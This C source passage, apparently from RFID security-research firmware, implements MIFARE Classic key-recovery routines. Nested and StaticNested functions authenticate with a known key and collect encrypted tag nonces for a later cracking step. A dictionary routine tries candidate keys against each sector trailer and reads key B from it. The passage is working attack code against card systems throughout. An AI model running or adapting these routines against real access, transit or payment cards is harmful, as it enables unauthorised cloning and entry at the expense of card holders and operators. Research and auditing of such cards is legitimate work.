uint8_t nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_nested_core_t ncs[SETS_NR]) {
    uint8_t m, res;
    // all operations must be based on the card
    res = pcd_14a_reader_scan_auto(p_tag_info);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    //Then collect the specified number of random array
    for (m = 0; m < SETS_NR; m++) {
        res = nested_recover_core(
                  &(ncs[m]),
                  keyKnown,
                  blkKnown,
                  typKnown,
                  targetBlock,
                  targetType
              );
        if (res != STATUS_HF_TAG_OK) {
            return res;
        }
    }
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : NestedFollow detection implementation
* @param    :block   :The owner of the known secret key of the card
* @param    :type    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :key     : The U64 value of the known secret key of the card
* @param    :nd      : Random number distance detection results
* @retval   : Operating status value
*
*/
uint8_t nested_distance_detect(uint8_t block, uint8_t type, uint8_t *key, uint8_t *uid, uint32_t *distance) {
    uint8_t status      = STATUS_HF_TAG_OK;
    *distance   = 0;
    //Must ensure that there is a card on the court
    status = pcd_14a_reader_scan_auto(p_tag_info);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    } else {
        // At least the card exists, you can copy the UID to the buffer first
        get_4byte_tag_uid(p_tag_info, uid);
    }
    // Get distance, prepare for the next attack
    return measure_distance(bytes_to_num(key, 6), block, type, distance);
}

/**
* @brief    : StaticNested core, used to collect NT.
*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
* @param    :p_nt1       : NT1, non encrypted.
* @param    :p_nt2       : NT2, encrypted.
* @param    :keyKnown    : U64 value of the known key of the card
* @param    :blkKnown    : The sector to which the card's known secret key belongs
* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
* @param    :targetBlock : Target sectors that require nested attacks
* @param    :targetType  : Target key types that require nested attacks
* @param    :nestedAgain : StaticNested enhanced vulnerability, which can obtain two sets of encrypted random numbers based on nested verification of known keys
* @retval   : Successfully collected and returned to STATUS_HF_TAG_OK, otherwise an error code will be returned.
*
*/
uint8_t static_nested_recover_core(uint8_t *p_nt1, uint8_t *p_nt2, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, uint8_t nestedAgain) {
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs = &mpcs;
    uint8_t status, len;
    uint8_t parity[4] = {0x00};
    uint8_t answer[4] = {0x00};
    uint32_t uid, nt1, nt2;
    uid = get_u32_tag_uid(p_tag_info);
    pcd_14a_reader_halt_tag();
    if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    status = authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_FIRST, &nt1);
    if (status != STATUS_HF_TAG_OK) {
        return STATUS_MF_ERR_AUTH;
    }
    if (nestedAgain) {
        status = authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_NESTED, NULL);
        if (status != STATUS_HF_TAG_OK) {
            return STATUS_MF_ERR_AUTH;
        }
    }
    len = send_cmd(pcs, AUTH_NESTED, targetType, targetBlock, &status, answer, parity, U8ARR_BIT_LEN(answer));
    if (len != 32) {
        NRF_LOG_INFO("No 32 data recv on sendcmd: %d\r\n", len);
        return STATUS_HF_ERR_STAT;
    }
    nt2 = bytes_to_num(answer, 4);
    num_to_bytes(nt1, 4, p_nt1);
    num_to_bytes(nt2, 4, p_nt2);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : StaticNested encapsulates and calls the functions implemented by the core to collect 2 sets of random numbers.
*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
* @param    :keyKnown    : U64 value of the known key of the card
* @param    :blkKnown    : The sector to which the card's known secret key belongs
* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
* @param    :targetBlock : Target sectors that require nested attacks
* @param    :targetType  : Target key type that require nested attacks
* @param    :sncs        : StaticNested Decrypting Core Structure Array
* @retval   : Successfully collected and returned to STATUS_HF_TAG_OK, otherwise an error code will be returned.
*
*/
uint8_t static_nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_static_nested_core_t *sncs) {
    uint8_t res;
    res = pcd_14a_reader_scan_auto(p_tag_info);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    get_4byte_tag_uid(p_tag_info, sncs->uid);
    res = static_nested_recover_core(sncs->core[0].nt1, sncs->core[0].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, false);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    res = static_nested_recover_core(sncs->core[1].nt1, sncs->core[1].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, true);
    if (res != STATUS_HF_TAG_OK) {
        return res;
    }
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Use the RC522 M1 algorithm module to verify the key
* @retval   : validationResults
*
*/
uint16_t auth_key_use_522_hw(uint8_t block, uint8_t type, uint8_t *key) {
    // Each verification of a block must re -find a card
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    // After finding the card, we start to verify!
    return pcd_14a_reader_mf1_auth(p_tag_info, type, block, key);
}

inline void mf1_toolbox_antenna_restart () {
    pcd_14a_reader_reset();
    pcd_14a_reader_antenna_on();
    bsp_delay_ms(8);
}

inline void mf1_toolbox_report_healthy () {
    bsp_wdt_feed();
    while (NRF_LOG_PROCESS());
}

uint16_t mf1_toolbox_check_keys_of_sectors (
    mf1_toolbox_check_keys_of_sectors_in_t *in,
    mf1_toolbox_check_keys_of_sectors_out_t *out
) {
    memset(out, 0, sizeof(mf1_toolbox_check_keys_of_sectors_out_t));
    uint8_t trailer[18] = {}; // trailer 16 bytes + padding 2 bytes

    // keys unique
    uint8_t i, j, maskSector, maskShift, trailerNo;
    for (i = 0; i < in->keys_len; i++) {
        for (j = i + 1; j < in->keys_len; j++) {
            if (memcmp(&in->keys[i], &in->keys[j], sizeof(mf1_key_t)) != 0) continue;

            // key duplicated, replace with last key
            if (j != in->keys_len - 1) in->keys[j] = in->keys[in->keys_len - 1];
            in->keys_len--;
            j--;
        }
    }

    uint16_t status = STATUS_HF_TAG_OK;
    bool skipKeyB;
    for (i = 0; i < 40; i++) {
        maskShift = 6 - i % 4 * 2;
        maskSector = (in->mask.b[i / 4] >> maskShift) & 0b11;
        trailerNo = i < 32 ? i * 4 + 3 : i * 16 - 369; // trailerNo of sector
        skipKeyB = (maskSector & 0b1) > 0;
        if ((maskSector & 0b10) == 0) {
            for (j = 0; j < in->keys_len; j++) {
                mf1_toolbox_report_healthy();
                if (status != STATUS_HF_TAG_OK) mf1_toolbox_antenna_restart();

                status = auth_key_use_522_hw(trailerNo, PICC_AUTHENT1A, in->keys[j].key);
                if (status != STATUS_HF_TAG_OK) { // auth failed
                    if (status == STATUS_HF_TAG_NO) return STATUS_HF_TAG_NO;
                    continue;
                }
                // key A found
                out->found.b[i / 4] |= 0b10 << maskShift;
                out->keys[i][0] = in->keys[j];
                // try to read keyB from trailer of sector
                status = pcd_14a_reader_mf1_read(trailerNo, trailer);
                // key B not in trailer
                if (status != STATUS_HF_TAG_OK || 0 == *(uint64_t*) &trailer[10]) break;
                // key B found
                skipKeyB = true;
                out->found.b[i / 4] |= 0b1 << maskShift;
                out->keys[i][1] = *(mf1_key_t*)&trailer[10];
                break;
            }
        }
        if (skipKeyB) continue;

        for (j = 0; j < in->keys_len; j++) {
            mf1_toolbox_report_healthy();
            if (status != STATUS_HF_TAG_OK) mf1_toolbox_antenna_restart();

            status = auth_key_use_522_hw(trailerNo, PICC_AUTHENT1B, in->keys[j].key);
            if (status != STATUS_HF_TAG_OK) { // auth failed
                if (status == STATUS_HF_TAG_NO) return STATUS_HF_TAG_NO;
                continue;
            }
            // key B found
            out->found.b[i / 4] |= 0b1 << maskShift;
            out->keys[i][1] = in->keys[j];
            break;
        }
    }

    return STATUS_HF_TAG_OK;
}
